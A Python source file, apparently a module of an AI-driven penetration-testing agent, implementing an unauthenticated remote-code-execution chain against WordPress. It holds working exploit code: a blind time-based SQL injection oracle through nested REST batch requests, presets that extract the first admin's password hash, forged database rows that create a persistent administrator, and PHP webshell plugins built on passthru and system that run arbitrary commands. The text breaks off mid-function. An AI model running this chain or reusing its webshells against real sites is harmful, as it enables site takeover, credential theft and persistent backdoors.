"""WordPress core REST /batch/v1 route-confusion (CVE-2026-63030) chained with the author__not_in
WP_Query blind SQL injection (CVE-2026-60137) -- both in CISA KEV, unauthenticated-to-RCE against
WordPress 6.8.x/6.9.x/7.0.x/7.1-beta before the 6.8.6/6.9.5/7.0.2/7.1-beta2 fixes.

Ported into ASRA's own architecture (httpx, this project's naming, the same allowed_targets +
EXPLOIT_REQUIRE_APPROVAL gate every other exploitation tool goes through -- see
agent/tools/registry.py's requires_allowed_target and agent/core.py's exploit-approval wait) rather
than shelling out to third-party code. Neither the WordPress core GitHub Security Advisories
(GHSA-ff9f-jf42-662q, GHSA-fpp7-x2x2-2mjf) nor the vendor write-ups that followed (Rapid7, Akamai)
publish the actual request/payload shapes -- both explicitly withhold them pending full disclosure
-- so this technique could not be reconstructed from public sources alone. The concrete mechanics
below (the nested-batch envelope shapes, the DB-row-forgery format, the oEmbed -> changeset ->
re-entrant parse_request escalation) were grounded against a working reference implementation
supplied locally, then re-derived here as this project's own code.

Two independent working batch-envelope shapes reach the same author_exclude -> author__not_in
vulnerability and are kept as two separate classes (_CategoriesBatchOracle / _UsersBatchRce)
rather than merged into one generic one: blending two verified-working shapes into an invented
hybrid risks silently producing something that matches neither and works against nothing.

Real state changes performed here are substantial (a forged administrator account persists after
`wp_batch_rce`; a dropped plugin file is the RCE vector) -- exactly why every entry point below is
category="exploit"/requires_allowed_target=True, same risk tier as sqlmap/msfconsole/exploit_db_run.
"""
from __future__ import annotations

import base64
import hashlib
import html
import io
import json
import re
import secrets
import statistics
import time
import urllib.parse
import uuid
import zipfile
from typing import Callable

import httpx

from agent.tools.builders.validators import validate_target
from agent.tools.native import _merged_target_headers
from agent.utils.logger import get_logger

logger = get_logger("TOOLS")

_DEFAULT_TIMEOUT = 30.0
_GENERATOR_META_RE = re.compile(r'name="generator"\s+content="WordPress ([^"]+)"')
_NONCE_RE = re.compile(r'name="_wpnonce"\s+value="([a-f0-9]+)"')
_ACTIVATE_LINK_RE = re.compile(r'href="([^"]*plugins\.php\?action=activate[^"]*)"')


def _base_url(target: str) -> str:
    target = validate_target(target)
    base = target if "://" in target else f"https://{target}"
    return base.rstrip("/")


def _client(params: dict, *, follow_redirects: bool = True) -> httpx.Client:
    """One httpx.Client convention shared by every function below: verify=False (a self-signed/
    expired cert on a real in-scope host is the norm in a pentest, not an SSRF risk -- same
    reasoning as native.py's _target_client_kwargs) and the operator's own custom User-Agent/
    headers (_merged_target_headers) so traffic stays identifiable to a bug-bounty program that
    requires it.
    """
    return httpx.Client(
        timeout=_DEFAULT_TIMEOUT,
        follow_redirects=follow_redirects,
        headers=_merged_target_headers(params),
        verify=False,
    )


def _post_preserving_method(client: httpx.Client, url: str, *, json_body: dict | None = None, max_hops: int = 5) -> httpx.Response:
    """POSTs to url and manually follows any 301/302/303/307/308 redirect while preserving the POST
    method and body. httpx's own automatic redirect handling (like every browser-shaped HTTP
    client) downgrades a redirected POST to a bodyless GET on 301/302/303 -- only 307/308 are
    spec-preserving by default -- which would silently drop the batch payload the instant a target
    redirects http->https or to a canonical host, producing a false negative instead of a real
    result.
    """
    resp = client.post(url, json=json_body, follow_redirects=False)
    hops = 0
    while resp.status_code in (301, 302, 303, 307, 308) and hops < max_hops:
        location = resp.headers.get("location")
        if not location:
            break
        url = urllib.parse.urljoin(str(resp.url), location)
        resp = client.post(url, json=json_body, follow_redirects=False)
        hops += 1
    return resp


# ==========================================================================
# Version fingerprint + scope check (CVE-2026-63030 affects 6.9.x/7.0.x/7.1-beta before the fix;
# CVE-2026-60137 alone, no RCE chain, affects 6.8.x before its own fix)
# ==========================================================================
def _version_sort_key(version: str) -> tuple[int, int, int, int, int]:
    """WordPress version -> a tuple that orders pre-releases correctly (alpha < beta < rc < stable),
    e.g. 7.1-beta1 < 7.1-beta2 < 7.1."""
    head, _, tail = version.partition("-")
    nums = [int(x) for x in re.findall(r"\d+", head)[:3]]
    while len(nums) < 3:
        nums.append(0)
    stage, sub = 3, 0  # no suffix == stable release
    tail_lower = tail.lower()
    if tail_lower.startswith("alpha"):
        stage = 0
    elif tail_lower.startswith("beta"):
        stage = 1
    elif tail_lower.startswith("rc"):
        stage = 2
    if tail:
        m = re.search(r"\d+", tail)
        sub = int(m.group()) if m else 0
    return (*nums, stage, sub)


def _affected_by_batch_chain(version: str | None) -> tuple[str, str] | None:
    if not version:
        return None
    try:
        k = _version_sort_key(version)
    except (ValueError, IndexError):
        return None
    if ((6, 9, 0, 0, 0) <= k < (6, 9, 5, 3, 0)
            or (7, 0, 0, 0, 0) <= k < (7, 0, 2, 3, 0)
            or (7, 1, 0, 0, 0) <= k < (7, 1, 0, 1, 2)):
        return ("RCE", "CVE-2026-63030 (chains CVE-2026-60137)")
    if (6, 8, 0, 0, 0) <= k < (6, 8, 6, 3, 0):
        return ("SQLi", "CVE-2026-60137 (no RCE chain on the 6.8.x line)")
    return None


def wp_batch_scan(params: dict) -> dict:
    """Non-destructive exposure check: fingerprints the WordPress core version from the homepage's
    <meta name="generator"> tag and confirms the REST /batch/v1 route is actually reachable --
    no exploit payload sent, so this needs neither the exploitation allowlist nor session approval.
    Run this before wp_batch_sqli_check/wp_batch_rce to know whether the target is even a
    candidate.
    """
    base = _base_url(params["target"])
    try:
        with _client(params) as client:
            home = client.get(base + "/")
            version_match = _GENERATOR_META_RE.search(home.text)
            version = version_match.group(1).strip() if version_match else None
            batch_probe = client.post(base + "/?rest_route=/batch/v1", json={})
    except httpx.HTTPError as exc:
        logger.debug("wp_batch_scan: target=%s unreachable: %s", base, exc)
        return {"status": "error", "error": f"could not reach target: {exc}"}

    route_reachable = "rest_missing_callback_param" in batch_probe.text or "rest_invalid_param" in batch_probe.text
    hit = _affected_by_batch_chain(version)
    severity, cve = hit if hit else (None, None)
    if hit and route_reachable:
        verdict = f"vulnerable ({severity}, {cve})"
    elif hit:
        verdict = f"version-affected ({severity}, {cve}), batch route unconfirmed"
    elif version:
        verdict = "not affected"
    else:
        verdict = "wordpress not detected"

    logger.debug("wp_batch_scan: target=%s version=%s route_reachable=%s verdict=%s", base, version, route_reachable, verdict)
    return {
        "status": "ok", "target": base, "version": version, "batch_route_reachable": route_reachable,
        "severity": severity, "cve": cve, "verdict": verdict,
    }


# ==========================================================================
# Shared timing-oracle extraction: both nested-batch shapes below reduce to the same boolean
# length/byte binary search once they can each answer one yes/no timing question.
# ==========================================================================
def _extract_via_oracle(oracle: Callable[[str], bool], expr: str, max_len: int, *, null_repr: str = "0x00", byte_range: tuple[int, int] = (0, 255)) -> str:
    value = f"COALESCE(({expr}),{null_repr})"
    lo, hi = 0, max_len
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if oracle(f"CHAR_LENGTH({value}) >= {mid}"):
            lo = mid
        else:
            hi = mid - 1
    length = lo
    lo_byte, hi_byte = byte_range
    out: list[str] = []
    for pos in range(1, length + 1):
        a, b = lo_byte, hi_byte
        while a < b:
            mid = (a + b + 1) // 2
            if oracle(f"ASCII(SUBSTRING({value},{pos},1)) >= {mid}"):
                a = mid
            else:
                b = mid - 1
        out.append(chr(a))
    return "".join(out)


# ==========================================================================
# check / read -- standalone, read-only blind SQLi confirm + extraction (no DB writes, no admin
# forged). Batch shape: outer batch -> /wp/v2/posts -> nested /wp/v2/categories, author_exclude
# carries the injection as a direct SLEEP-in-IF scalar.
# ==========================================================================
class _CategoriesBatchOracle:
    def __init__(self, client: httpx.Client, base: str, *, table_prefix: str = "wp_", delay: float = 0.15, repeats: int = 1):
        self.client = client
        self.batch_url = base.rstrip("/") + "/?rest_route=/batch/v1"
        self.prefix = table_prefix
        self.delay = delay
        self.repeats = repeats
        self.cutoff: float | None = None

    def _payload(self, condition: str) -> dict:
        inject = f"SELECT IF(({condition}),SLEEP({self.delay}),0)"
        query = urllib.parse.urlencode({"author_exclude": inject})
        return {"requests": [
            {"method": "POST", "path": "http://:"},
            {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": [
                {"method": "GET", "path": "http://:"},
                {"method": "GET", "path": "/wp/v2/categories?" + query},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]}},
            {"method": "POST", "path": "/batch/v1"},
        ]}

    def _once(self, condition: str) -> float:
        start = time.perf_counter()
        _post_preserving_method(self.client, self.batch_url, json_body=self._payload(condition))
        return time.perf_counter() - start

    def probe(self, condition: str) -> float:
        if self.repeats == 1:
            return self._once(condition)
        return statistics.median(self._once(condition) for _ in range(self.repeats))

    def calibrate(self, rounds: int = 3) -> tuple[float, float]:
        fast = statistics.median(self.probe("1=0") for _ in range(rounds))
        slow = statistics.median(self.probe("1=1") for _ in range(rounds))
        self.cutoff = (fast + slow) / 2
        return fast, slow

    def oracle(self, condition: str) -> bool:
        if self.cutoff is None:
            self.calibrate()
        return self.probe(condition) > self.cutoff

    def preset(self, name: str) -> str:
        p = self.prefix
        presets = {
            "version": "@@version",
            "database": "DATABASE()",
            "db_user": "CURRENT_USER()",
            "users": f"SELECT CONCAT_WS(0x3a,user_login,user_pass) FROM {p}users ORDER BY ID ASC LIMIT 1",
            "siteurl": f"SELECT option_value FROM {p}options WHERE option_name=0x7369746575726c LIMIT 1",
        }
        if name not in presets:
            raise KeyError(name)
        return presets[name]


def wp_batch_sqli_check(params: dict) -> dict:
    """Confirms blind time-based SQLi via a harmless differential probe (1=0 vs 1=1) -- no data
    read, no DB write. Requires the target to be in the exploitation allowlist and the session to
    be human-approved, same as sqlmap: this sends live payloads against the real target, even
    though the payloads themselves are inert.
    """
    base = _base_url(params["target"])
    delay = float(params.get("delay", 0.15))
    repeats = int(params.get("repeats", 1))
    try:
        with _client(params, follow_redirects=False) as client:
            oracle = _CategoriesBatchOracle(client, base, delay=delay, repeats=repeats)
            fast, slow = oracle.calibrate()
    except httpx.HTTPError as exc:
        logger.debug("wp_batch_sqli_check: target=%s request failed: %s", base, exc)
        return {"status": "error", "error": f"request failed: {exc}"}

    margin = slow - fast
    vulnerable = margin >= max(0.08, delay * 0.5)
    logger.debug("wp_batch_sqli_check: target=%s fast=%.3f slow=%.3f margin=%.3f vulnerable=%s", base, fast, slow, margin, vulnerable)
    return {"status": "ok", "target": base, "fast": fast, "slow": slow, "margin": margin, "vulnerable": vulnerable}


def wp_batch_sqli_read(params: dict) -> dict:
    """Extracts one scalar value via blind SQLi (a built-in preset, or a raw SQL expression via
    `expr`) -- read-only, no DB write, no admin forged. Presets: version, database, db_user, users
    (login:password-hash of the lowest-ID account, near-always the first admin -- crack offline,
    then use with wp_batch_shell), siteurl. Requires the exploitation allowlist + session approval,
    same as sqlmap.
    """
    base = _base_url(params["target"])
    delay = float(params.get("delay", 0.15))
    repeats = int(params.get("repeats", 1))
    max_len = int(params.get("max_len", 128))
    expr = params.get("expr")
    preset = params.get("preset", "users")

    try:
        with _client(params, follow_redirects=False) as client:
            engine = _CategoriesBatchOracle(client, base, table_prefix=params.get("prefix", "wp_"), delay=delay, repeats=repeats)
            if not expr:
                try:
                    expr = engine.preset(preset)
                except KeyError:
                    return {"status": "error", "error": f"unknown preset: {preset!r} -- use version|database|db_user|users|siteurl, or pass expr directly"}
            engine.calibrate()
            value = _extract_via_oracle(engine.oracle, expr, max_len)
    except httpx.HTTPError as exc:
        logger.debug("wp_batch_sqli_read: target=%s request failed: %s", base, exc)
        return {"status": "error", "error": f"request failed: {exc}"}

    logger.debug("wp_batch_sqli_read: target=%s expr=%s value_len=%d", base, expr, len(value))
    return {"status": "ok", "target": base, "expr": expr, "value": value}


# ==========================================================================
# rce -- credential-less pre-auth RCE. Batch shape: outer batch -> /wp/v2/posts -> nested
# /wp/v2/users, author_exclude carries a UNION/comment-breakout payload (this shape, unlike the
# categories one above, is also used to smuggle real INSERT-shaped UNION SELECT rows past the
# read-only WP_Query context -- see _forge below).
# Route confusion + SQLi root cause: Adam Kues (Assetnote). Stock-default admin-forgery escalation
# (oEmbed -> changeset -> re-entrant parse_request): Mustafa Can Ipekci (nukedx). This module is
# ASRA's own re-implementation of that published mechanism, not a copy of either author's code.
# ==========================================================================
class _UsersBatchRce:
    _EMBED_ATTR = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'

    def __init__(self, client: httpx.Client, base: str, *, sleep_seconds: float = 4.0):
        self.client = client
        self.base = base.rstrip("/")
        self.sleep_seconds = sleep_seconds
        self.batch_url: str | None = None
        self._baseline = 0.0

    def _normalize_base(self) -> None:
        """Follows redirects on the root once and pins the canonical scheme://host so the batch
        POST goes straight to the final host -- only scheme+host are taken (never a redirected
        path), so REST routes stay correct."""
        try:
            resp = self.client.get(self.base + "/", follow_redirects=True)
            parsed = urllib.parse.urlparse(str(resp.url))
            if parsed.scheme and parsed.netloc:
                canon = f"{parsed.scheme}://{parsed.netloc}"
                if canon != self.base:
                    self.base = canon
                    self.batch_url = None
        except httpx.HTTPError:
            pass

    def _endpoints(self) -> list[str]:
        return [self.base + "/?rest_route=/batch/v1", self.base + "/wp-json/batch/v1"]

    @staticmethod
    def _envelope(author_exclude: str) -> dict:
        """Nested batch (route confusion) landing author_exclude in author__not_in."""
        encoded = urllib.parse.quote(author_exclude, safe="")
        inner = {"requests": [
            {"method": "POST", "path": "///"},
            {"method": "GET", "path": "/wp/v2/users?author_exclude=" + encoded},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]}
        return {"requests": [
            {"method": "POST", "path": "/v2/categories", "body": {"name": "x"}},
            {"method": "POST", "path": "///", "body": {"name": "x"}},
            {"method": "POST", "path": "/wp/v2/posts", "body": inner},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}

    def probe(self, author_exclude: str) -> float:
        self._normalize_base()
        body = self._envelope(author_exclude)
        if self.batch_url is None:
            for endpoint in self._endpoints():
                start = time.perf_counter()
                resp = _post_preserving_method(self.client, endpoint, json_body=body)
                if resp.status_code in (200, 207):
                    self.batch_url = str(resp.url)
                    return time.perf_counter() - start
            self.batch_url = self._endpoints()[0]
        start = time.perf_counter()
        _post_preserving_method(self.client, self.batch_url, json_body=body)
        return time.perf_counter() - start

    @staticmethod
    def _sleep_payload(seconds: float) -> str:
        return f"0) OR (SELECT 1 FROM (SELECT SLEEP({seconds:g}))x)-- -"

    def detect(self, rounds: int = 3) -> dict:
        fast = statistics.median(self.probe(self._sleep_payload(0)) for _ in range(rounds))
        slow = statistics.median(self.probe(self._sleep_payload(self.sleep_seconds)) for _ in range(rounds))
        self._baseline = fast
        delta = slow - fast
        vulnerable = delta >= (self.sleep_seconds * 0.6) and fast < (self.sleep_seconds * 0.5)
        return {"fast": fast, "slow": slow, "delta": delta, "vulnerable": vulnerable}

    def _oracle(self, condition: str, unit: float = 0.6) -> bool:
        payload = f"0) OR (SELECT 1 FROM (SELECT IF(({condition}),SLEEP({unit:g}),0))x)-- -"
        elapsed = self.probe(payload)
        return elapsed > (self._baseline + unit * 0.6)

    def read_scalar(self, expr: str, max_len: int = 40) -> str:
        return _extract_via_oracle(self._oracle, expr, max_len, null_repr="''", byte_range=(32, 126))

    def read_int(self, query: str, unit: float = 0.6) -> int:
        expr = f"COALESCE(({query}),0)"
        lo, hi = 0, 1
        while self._oracle(f"{expr} >= {hi}", unit):
            lo, hi = hi, hi * 2
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._oracle(f"{expr} >= {mid}", unit):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def _rce_send(self, inner_requests: list[dict], timeout: float | None = None) -> bytes:
        payload = {"requests": [
            {"method": "POST", "path": "http://:"},
            {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": inner_requests}},
            {"method": "POST", "path": "/batch/v1"},
        ]}
        endpoint = self.batch_url or self._endpoints()[0]
        resp = self.client.post(endpoint, json=payload, follow_redirects=False, timeout=timeout or _DEFAULT_TIMEOUT)
        return resp.content

    @staticmethod
    def _hex(value: str) -> str:
        return f"0x{value.encode().hex()}" if value else "''"

    def _post_row(self, post_id: int, content: str, title: str, status: str, name: str, parent: int, post_type: str) -> str:
        h = self._hex
        return ",".join((
            str(post_id), "1",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"),
            h(content), h(title), "''",
            h(status), h("closed"), h("closed"), "''",
            h(name), "''", "''",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"), "''",
            str(parent), "''", "0",
            h(post_type), "''", "0",
        ))

    def _forge(self, rows: tuple[str, ...], extra_requests: list[dict] = ()) -> None:
        """Escalates the read-only oracle into a real DB write: a UNION-based row injection into
        the SAME author_exclude context, smuggled through /wp/v2/widgets (which -- unlike the
        posts-listing endpoints above -- returns full result rows, letting the union actually
        surface real INSERT-shaped data through wp_posts)."""
        query = "1) AND 1=0 UNION ALL SELECT " + " UNION ALL SELECT ".join(rows) + " -- -"
        self._rce_send([
            {"method": "GET", "path": "http://:"},
            {"method": "GET", "path": "/wp/v2/widgets?" + urllib.parse.urlencode({
                "author_exclude": query, "per_page": -1, "orderby": "none", "context": "view",
            })},
            {"method": "GET", "path": "/wp/v2/posts"},
            *extra_requests,
        ], timeout=60)

    def deploy(self) -> tuple[str, str, Callable[[str], str], Callable[[], None]]:
        """Runs the full pre-auth chain up to a live, self-cleaning webshell. Returns (username,
        password, run, cleanup): run(command) executes one shell command and returns its output;
        cleanup() deactivates and deletes the dropped plugin. The forged administrator account is
        deliberately left in place (removing it would need the same SQLi write primitive again, and
        the operator may still need it for wp_batch_shell-style follow-up access) -- splitting
        deploy from run lets a caller execute several commands over one dropped webshell before
        cleaning up.
        """
        self._normalize_base()

        anchor = self.client.get(
            self.base + "/?rest_route=/wp/v2/posts&per_page=1&_fields=link", follow_redirects=True,
        )
        items = anchor.json() if anchor.status_code == 200 else []
        if not items or not items[0].get("link"):
            raise RuntimeError("no published post available for oEmbed anchor")

        link = urllib.parse.urlsplit(items[0]["link"])
        token = secrets.token_hex(6)
        embed_urls = [
            urllib.parse.urlunsplit((link.scheme, link.netloc, link.path, link.query, f"{token}{i}"))
            for i in range(3)
        ]

        logger.debug("wp_batch_rce: seeding oEmbed caches (read-only SQLi -> real DB writes)")
        seed_content = "".join(f'[embed width="500" height="750"]{u}[/embed]' for u in embed_urls)
        self._forge((self._post_row(0, seed_content, "seed", "publish", "seed", 0, "post"),))

        logger.debug("wp_batch_rce: recon: reading DB table prefix via blind SQLi")
        posts_table = self.read_scalar(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() "
            "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1",
            64,
        )
        if not re.fullmatch(r"[A-Za-z0-9_$]+", posts_table):
            raise RuntimeError(f"could not resolve posts table (got {posts_table!r})")
        prefix = posts_table[:-5]
        logger.debug("wp_batch_rce: table prefix=%r", prefix)

        capabilities_meta_key = self._hex(prefix + "capabilities")
        administrator_marker = self._hex('s:13:"administrator";b:1;')
        admin_id = self.read_int(
            f"SELECT u.ID FROM `{prefix}users` u JOIN `{prefix}usermeta` m ON m.user_id=u.ID "
            f"WHERE m.meta_key={capabilities_meta_key} "
            f"AND INSTR(m.meta_value,{administrator_marker})>0 ORDER BY u.ID LIMIT 1"
        )
        if admin_id < 1:
            raise RuntimeError("could not locate an administrator account")
        logger.debug("wp_batch_rce: admin ID=%d", admin_id)

        cache_ids: list[int] = []
        for embed_url in embed_urls:
            key = hashlib.md5((embed_url + self._EMBED_ATTR).encode()).hexdigest()
            pid = self.read_int(
                f"SELECT ID FROM `{posts_table}` WHERE post_type=0x6f656d6265645f6361636865 "
                f"AND post_name=0x{key.encode().hex()} ORDER BY ID DESC LIMIT 1"
            )
            if pid < 1:
                raise RuntimeError("oEmbed cache seeding failed (no cache post found)")
            cache_ids.append(pid)
        if len(set(cache_ids)) != 3:
            raise RuntimeError("oEmbed cache IDs were not distinct")
        logger.debug("wp_batch_rce: oEmbed cache IDs=%s", cache_ids)

        username = f"asra_{token}"
        password = f"Asra!{secrets.token_urlsafe(15)}"
        email = f"{username}@asra.local"
        outer = 1800000000 + secrets.randbelow(100000000)
        nav_id, inner_id = outer + 1, outer + 2

        changeset = json.dumps({
            f"nav_menu_item[{nav_id}]": {
                "value": {
                    "object_id": 0, "object": "", "menu_item_parent": 0, "position": 0,
                    "type": "custom", "title": "proof", "url": "https://example.invalid/asra-wp-batch-rce",
                    "target": "", "attr_title": "", "description": "proof", "classes": "", "xfn": "",
                    "status": "publish", "nav_menu_term_id": 0, "_invalid": False,
                },
                "type": "nav_menu_item", "user_id": admin_id,
            },
        }, separators=(",", ":"))

        poisoned = (
            self._post_row(0, f'[embed width="500" height="750"]{embed_urls[1]}[/embed]', "trigger", "publish", "trigger", 0, "post"),
            self._post_row(cache_ids[0], changeset, "changeset", "future", str(uuid.uuid4()), outer, "customize_changeset"),
            self._post_row(outer, "outer", "outer", "draft", "outer", cache_ids[0], "post"),
            self._post_row(cache_ids[1], "", "cache", "publish", "cache", cache_ids[0], "post"),
            self._post_row(nav_id, "nav", "nav", "publish", "nav", cache_ids[2], "nav_menu_item"),
            self._post_row(cache_ids[2], "parse", "parse", "parse", "parse", inner_id, "request"),
            self._post_row(inner_id, "inner", "inner", "draft", "inner", cache_ids[2], "post"),
        )
        new_admin = {"username": username, "email": email, "password": password, "roles": ["administrator"]}

        logger.debug("wp_batch_rce: forging changeset elevation + re-entrant parse_request, creating administrator")
        self._forge(poisoned, extra_requests=[
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
        ])

        logger.debug("wp_batch_rce: administrator created email=%s", email)
        session = httpx.Client(timeout=_DEFAULT_TIMEOUT, follow_redirects=True, headers=dict(self.client.headers), verify=False)
        session.get(self.base + "/wp-login.php")
        session.post(self.base + "/wp-login.php", data={
            "log": username, "pwd": password, "wp-submit": "Log In",
            "redirect_to": self.base + "/wp-admin/", "testcookie": "1",
        })
        users_page = session.get(self.base + "/wp-admin/users.php").text
        if username not in users_page:
            session.close()
            raise RuntimeError("admin login failed after forging the account (user not actually created?)")

        slug = f"asra-{secrets.token_hex(6)}"
        route = secrets.token_hex(12)
        marker = secrets.token_hex(12)
        php = (
            "<?php\n"
            f"/* Plugin Name: {slug} */\n"
            "add_action('rest_api_init', function () {\n"
            f"    register_rest_route('asra/v1', '/{route}', array(\n"
            "        'methods' => 'POST', 'permission_callback' => '__return_true',\n"
            "        'callback' => function ($r) {\n"
            "            if ($r->get_param('rm')) {\n"
            "                require_once ABSPATH.'wp-admin/includes/plugin.php';\n"
            "                deactivate_plugins(plugin_basename(__FILE__), true);\n"
            "                @unlink(__FILE__);\n"
            f"                return new WP_REST_Response(array('marker' => '{marker}', 'output' => 'ASRA_REMOVED'));\n"
            "            }\n"
            "            ob_start(); passthru(base64_decode($r->get_param('c')).' 2>&1');\n"
            "            $o = ob_get_clean();\n"
            f"            return new WP_REST_Response(array('marker' => '{marker}', 'output' => $o));\n"
            "        },\n"
            "    ));\n"
            "});\n"
        ).encode()

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr(f"{slug}/{slug}.php", php)

        upload_page = session.get(self.base + "/wp-admin/plugin-install.php?tab=upload").text
        nonce_match = _NONCE_RE.search(upload_page)
        if not nonce_match:
            session.close()
            raise RuntimeError("plugin-upload nonce not found")

        upload_resp = session.post(
            self.base + "/wp-admin/update.php?action=upload-plugin",
            data={"_wpnonce": nonce_match.group(1), "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload"},
            files={"pluginzip": (f"{slug}.zip", buf.getvalue(), "application/zip")},
        )
        activate_match = _ACTIVATE_LINK_RE.search(upload_resp.text)
        if not activate_match:
            session.close()
            raise RuntimeError("plugin install/activation link not found")
        session.get(urllib.parse.urljoin(self.base + "/wp-admin/", html.unescape(activate_match.group(1))))

        shell_url = self.base + f"/?rest_route=/asra/v1/{route}"

        def _call(payload: dict) -> str:
            resp = session.post(shell_url, json=payload)
            result = resp.json()
            if result.get("marker") != marker:
                raise RuntimeError("webshell did not respond correctly (dropped file unreachable or overwritten)")
            return result["output"]

        def run(command: str) -> str:
            return _call({"c": base64.b64encode(command.encode()).decode()})

        def cleanup() -> None:
            try:
                _call({"rm": "1"})
            except (httpx.HTTPError, RuntimeError, ValueError):
                pass
            finally:
                session.close()

        return username, password, run, cleanup


def wp_batch_rce(params: dict) -> dict:
    """Credential-less pre-auth RCE: confirms the blind SQLi timing oracle, forges its own
    administrator account through it (oEmbed -> changeset -> re-entrant parse_request), deploys a
    self-cleaning webshell plugin, runs ONE command, then removes the webshell (the forged admin
    account itself is left in place -- see _UsersBatchRce.deploy's docstring for why). Real,
    substantial state change on the target: requires the exploitation allowlist and human-approved
    session, same tier as sqlmap/msfconsole.
    """
    base = _base_url(params["target"])
    cmd = params.get("cmd", "id")
    sleep_seconds = float(params.get("sleep", 4.0))
    rounds = int(params.get("rounds", 3))

    with _client(params, follow_redirects=False) as client:
        engine = _UsersBatchRce(client, base, sleep_seconds=sleep_seconds)
        try:
            detection = engine.detect(rounds=rounds)
        except httpx.HTTPError as exc:
            logger.debug("wp_batch_rce: target=%s detect() failed: %s", base, exc)
            return {"status": "error", "error": f"request failed during SQLi detection: {exc}"}

        if not detection["vulnerable"]:
            logger.debug("wp_batch_rce: target=%s not vulnerable (fast=%.3f slow=%.3f)", base, detection["fast"], detection["slow"])
            return {"status": "error", "error": f"not vulnerable — no time differential (fast={detection['fast']:.3f}s slow={detection['slow']:.3f}s)"}

        try:
            username, password, run, cleanup = engine.deploy()
        except (RuntimeError, httpx.HTTPError) as exc:
            logger.debug("wp_batch_rce: target=%s deploy() failed: %s", base, exc)
            return {"status": "error", "error": f"exploit chain failed: {exc}"}

        try:
            output = run(cmd)
        except (RuntimeError, httpx.HTTPError) as exc:
            cleanup()
            logger.debug("wp_batch_rce: target=%s command execution failed: %s", base, exc)
            return {
                "status": "error", "error": f"forged administrator but command execution failed: {exc}",
                "forged_admin_username": username, "forged_admin_password": password,
            }
        cleanup()

    logger.debug("wp_batch_rce: target=%s RCE confirmed, forged admin=%s", base, username)
    return {
        "status": "ok", "target": base, "forged_admin_username": username, "forged_admin_password": password,
        "command": cmd, "output": output,
    }


# ==========================================================================
# shell / root-prereq -- authenticated RCE via a KNOWN admin password (recovered/cracked from
# wp_batch_sqli_read's "users" preset). No SQLi needed here: a token-gated plugin file is uploaded
# and reached directly, simpler than the persistent REST-route webshell wp_batch_rce drops.
# ==========================================================================
def _build_token_gated_plugin_zip(slug: str, token: str) -> bytes:
    php = (
        "<?php\n"
        f"/*\nPlugin Name: {slug}\n"
        "Description: ASRA authenticated RCE validation. Token-gated; self-deletes on ?rm=1.\n"
        "Version: 0.0.1\n*/\n"
        f"$__t = {token!r};\n"
        "if (isset($_GET['tok']) && hash_equals($__t, (string) $_GET['tok'])) {\n"
        "    if (isset($_GET['rm'])) { @unlink(__FILE__); echo 'ASRA_REMOVED'; exit; }\n"
        "    if (isset($_GET['c'])) {\n"
        "        echo \"ASRA_OUT_START\\n\";\n"
        "        system($_GET['c']);\n"
        "        echo \"\\nASRA_OUT_END\";\n"
        "    }\n"
        "    exit;\n"
        "}\n"
    ).encode()
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(f"{slug}/{slug}.php", php)
    return buf.getvalue()


def _run_authenticated_plugin_commands(client: httpx.Client, base: str, admin_user: str, admin_password: str, commands: list[tuple[str, str]]) -> dict:
    """Logs in with a known admin credential, drops a token-gated plugin file, runs each (label,
    command) pair through it, then cleans up. Returns {label: output} plus "_error" if any step
    failed before commands could run."""
    client.get(base + "/wp-login.php")
    client.post(base + "/wp-login.php", data={
        "log": admin_user, "pwd": admin_password, "wp-submit": "Log In",
        "redirect_to": base + "/wp-admin/", "testcookie": "1",
    })
    if not any(name.startswith("wordpress_logged_in") for name in client.cookies):
        return {"_error": "login failed (bad credentials or login hardening)"}

    slug = f"asra-{secrets.token_hex(4)}"
    token = secrets.token_urlsafe(18)
    zip_bytes = _build_token_gated_plugin_zip(slug, token)

    upload_page = client.get(base + "/wp-admin/plugin-install.php?tab=upload").text
    nonce_match = _NONCE_RE.search(upload_page)
    if not nonce_match:
        return {"_error": "could not read plugin-upload nonce"}

    upload_resp = client.post(
        base + "/wp-admin/update.php?action=upload-plugin",
        data={"_wpnonce": nonce_match.group(1), "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload", "install-plugin-submit": "Install Now"},
        files={"pluginzip": (f"{slug}.zip", zip_bytes, "application/zip")},
    )
    if "successfully" not in upload_resp.text.lower() and slug not in upload_resp.text.lower():
        logger.debug("wp_batch_shell: plugin upload response had no success marker, continuing anyway")

    shell_path = f"/wp-content/plugins/{slug}/{slug}.php"
    outputs: dict[str, str] = {}
    for label, cmd in commands:
        resp = client.get(base + shell_path, params={"tok": token, "c": cmd})
        match = re.search(r"ASRA_OUT_START\n(.*)\nASRA_OUT_END", resp.text, re.S)
        if not match:
            outputs["_error"] = f"no exec marker returned for {label!r} — dropped file may not be reachable"
            break
        outputs[label] = match.group(1)

    try:
        client.get(base + shell_path, params={"tok": token, "rm": "1"})
    except httpx.HTTPError as exc:
        logger.debug("wp_batch_shell: cleanup request failed (dropped plugin may need manual removal): %s", exc)
    return outputs


def wp_batch_shell(params: dict) -> dict:
    """Authenticated RCE using a known/recovered admin password (crack the hash from
    wp_batch_sqli_read's "users" preset) — logs in, uploads a token-gated plugin, runs ONE command,
    cleans up. Same allowlist + approval gate as sqlmap.
    """
    base = _base_url(params["target"])
    admin_user = params.get("admin_user", "admin")
    admin_password = params.get("admin_password")
    if not admin_password:
